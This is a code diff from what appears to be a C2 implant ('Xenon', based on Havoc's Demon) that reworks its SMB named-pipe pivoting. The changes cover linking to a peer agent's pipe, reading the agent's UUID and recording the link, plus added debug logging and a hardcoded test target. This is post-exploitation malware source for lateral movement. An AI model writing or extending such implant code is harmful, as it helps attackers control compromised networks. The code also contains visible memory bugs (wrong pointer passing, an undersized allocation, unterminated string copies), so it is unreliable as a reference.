@@ -27,16 +27,26 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
 
     SIZE_T targetLen    = 0;
     SIZE_T pipeLen      = 0;
-	PCHAR  Target 		= ParserGetString(arguments, &targetLen);
+	// PCHAR  Target 		= ParserGetString(arguments, &targetLen);
+    PCHAR Target = "test";
 	PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);
+
+    _dbg("SMB Link Target: %s", Target);
+    _dbg("SMB Link PipeName: %s", PipeName);
+
 
     /* Output */
     PVOID outBuf  = NULL;
     SIZE_T outLen = 0;
 
+
+    /* Connect to Pivot Agent */
     if ( !LinkAdd(Target, PipeName, &outBuf, &outLen) ) 
     {
         _err("Failed to link smb agent.");
+        DWORD error = GetLastError();
+        PackageError(taskUuid, error);
+        goto END;
     }
 
     // Response package
@@ -46,7 +56,7 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
     // success
     PackageComplete(taskUuid, NULL);
 
-end:
+END:
 
     return;
 }
@@ -65,10 +75,19 @@ VOID UnLink(PCHAR taskUuid, PPARSER arguments)
 }
 
 
-///////////////////////////////////////////////////////////////////
-////////////////        Helper Commands         ///////////////////
-///////////////////////////////////////////////////////////////////
+/**
+ * Helper Functions
+ * 
+ */
 
+
+
+ /**
+ * @brief Add a new SMB pivot link to Agent.
+ * 
+ * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Pivot.c  
+ * @return BOOL  
+ */
 BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
 {
     PLINKS LinkData    = NULL;
@@ -80,7 +99,7 @@ BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
 
     if ( hPipe == INVALID_HANDLE_VALUE )
     {
-        _dbg( "CreateFileA: Failed[%d]\n", GetLastError() );
+        _err("CreateFileA failed to connect to named pipe. ERROR : %d", GetLastError());
         return FALSE;
     }
 
@@ -97,16 +116,16 @@ BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
         // TODO: first get the size then parse
         if ( PeekNamedPipe( hPipe, NULL, 0, NULL, outLen, NULL ) )
         {
-            if ( *BytesSize > 0 )
+            if ( *outLen > 0 )
             {
-                _dbg( "BytesSize => %d\n", *BytesSize );
+                _dbg( "outLen => %d\n", *outLen );
 
-                *Output = LocalAlloc(LPTR, *BytesSize);
-                memset(*Output, 0, *BytesSize);
+                *outBuf = LocalAlloc(LPTR, *outLen);
+                memset(*outBuf, 0, *outLen);
 
-                if ( ReadFile( hPipe, *Output, *BytesSize, BytesSize, NULL ) )
+                if ( ReadFile( hPipe, *outBuf, *outLen, outLen, NULL ) )
                 {
-                    _dbg( "BytesSize Read => %d\n", *BytesSize );
+                    _dbg( "outLen Read => %d\n", *outLen );
                     break;
                 }
                 else
@@ -127,16 +146,16 @@ BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
 
     // Adding Link Data to the list
     {
-        _dbg( "Pivot :: Output[%p] Size[%d]\n", *Output, *BytesSize )
+        _dbg( "Pivot :: outBuf[%p] Size[%d]\n", *outBuf, *outLen )
 
-        PCHAR NewLinkId = NULL;
-        PivotParseLinkId(*Output, *BytesSize, *NewLinkId);
+        PCHAR NewLinkId = NULL;                                                 // Allocated in PivotParseLinkId must free
+        PivotParseLinkId(*outBuf, *outLen, *NewLinkId);      
 
         LinkData                  = LocalAlloc(LPTR, sizeof(PLINKS));
         LinkData->hPipe           = hPipe;
-        LinkData->next            = NULL;
+        LinkData->Next            = NULL;
         LinkData->LinkId          = NewLinkId;
-        LinkData->PipeName        = LocalAlloc( LPTR, strlen(PipeName));        // TODO - Check this feels sketchy strings
+        LinkData->PipeName        = LocalAlloc( LPTR, strlen(PipeName));        // TODO - Check this feels like an issue
         memcpy( LinkData->PipeName, PipeName, strlen(PipeName) );
 
         if ( ! xenonConfig->SmbLinks )
@@ -156,7 +175,7 @@ BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
 
                     else
                     {
-                        LinksList->Next = Data;
+                        LinksList->Next = LinkData;
                         break;
                     }
                 }
@@ -170,15 +189,15 @@ BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
 
 VOID PivotParseLinkId( PVOID buffer, SIZE_T size, PCHAR* LinkId )
 {
-    PARSER Parser  = { 0 };
-    UINT32 Value   = 0;
-    SIZE_T uuidLen = 0;
+    PARSER Parser   = { 0 };
+    PCHAR Value     = NULL;
+    SIZE_T uuidLen  = 0;
 
     ParserNew( &Parser, buffer, size );
 
-    PCHAR Value  = ParserStringCopy(&Parser, &uuidLen);
+    Value  = ParserStringCopy(&Parser, &uuidLen);
 
-    _dbg("Parsed SMB Link ID => %s \n", Value);
+    _dbg("Parsed SMB Link UUID => %s \n", Value);
 
     ParserDestroy(&Parser);
 
